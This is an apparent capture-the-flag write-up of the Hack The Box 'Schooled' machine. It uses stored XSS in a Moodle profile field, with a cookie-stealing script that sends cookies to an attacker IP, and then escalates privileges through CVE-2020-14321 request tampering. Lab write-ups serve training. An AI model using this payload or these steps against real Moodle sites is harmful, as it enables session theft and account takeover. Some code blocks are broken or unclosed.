# Moodle exploitation

## Information Gatheringx
### Nmap

>>> # Comming soon ................ 


<!-- ran nmap command and got 2 ports opened under 10000 pors

checking at port 80/tcp open, there was a standard HTML page with a domain name `schooled.htb`

we had nothing important apart from the default HTML directories

found a subdomain `moodle` and in the page we had a default moodle login page,created an account

![Alt text](/assets/img/htb/schooled/sc02.png)


after creating an account we have the default home page of moodle wihtout plugins or customizations of the homepage

![Alt text](/assets/img/htb/schooled/sc03.png)

### Finding the moodle version

After digging around, I checked the source code of moodle becuse it's an opensource project and in the folder theme, there was ,`upgrade.txt`
checking on the moodle we had ,I found the version of the moodle

![Alt text](/assets/img/htb/schooled/sc04.png)

Chekcing at the vulnerability we had a lot of vulnerabilities [ref](https://moodle.org/security/index.php?o=3&p=14)


![Alt text](/assets/img/htb/schooled/sc05.png)

### Finding the vulnerability

When you enrole in students, we have an announcement that someone will be checking soemthing, this indicated that there is some automation to do some  type of interaction with indicats a XXS vulnerability

![Alt text](/assets/img/htb/schooled/sc06.png)


Updating the MoodleNet profile with a h1 and b html tags we got had this 

![Alt text](/assets/img/htb/schooled/sc07.png)

So I tried to put a script in the box 

```javascript
<script scr = "http://10.10.16.27/unknown.js" > </script>
```
So the site hunged

![Alt text](/assets/img/htb/schooled/sc08.png)

and on the side we had a response

```yaml
┌──(root㉿kali)-[/home/…/Documents/CTFs/HackTheBox/Schooled]

so I tried to steal the cookie from server using 

```javascript
document.write('<img src="http://10.10.16.27/?'+document.cookie+'">');
```

and there we had it

After being a teacher , there is a vulnerability that allow teachers to privilege escalation from teacher role into manager role by Course enrolments `CVE-2020-14321`

Using the scrip I found online [ref]() , I was able to execute commands

```yaml

### Exploiting the vulnerabilities manually:

in the default homepage html ,only LIANNE is the manager

![Alt text](/assets/img/htb/schooled/sc11.png)


So we go participants and try to enrole her as a student in my course as a teacher

![Alt text](/assets/img/htb/schooled/sc12.png)

as we sent the request we intercept it with burp and modify some variables
1. userlist
2. roletoassigne 'of with roletoassigne 1 is the manager'


![Alt text](/assets/img/htb/schooled/sc13.png)

After modifying the traffic we forward it and we get manager role assignment 

![Alt text](/assets/img/htb/schooled/sc14.png)

When you now visit LIANNE , you can log in as administrator

![Alt text](/assets/img/htb/schooled/sc15.png)

once in the site administration, when you go to plugins you don't have the ability to install plugins

![Alt text](/assets/img/htb/schooled/sc16.png)

To enable the this option , go to Users , Permission.In her go to defined roles, manager, click manager,click edit  

![Alt text](/assets/img/htb/schooled/sc17.png)

When you click save , intercept the traffic and change the `return` value to this payload [reference](https://github.com/HoangKien1020/CVE-2020-14321?tab=readme-ov-file) 

![Alt text](/assets/img/htb/schooled/sc18.png)


we get an option to install plugin. This exploit is called `mass assignment vulnerability` 
![Alt text](/assets/img/htb/schooled/sc19.png)

The installed plugin has to be a zip file with some file structure fomalities
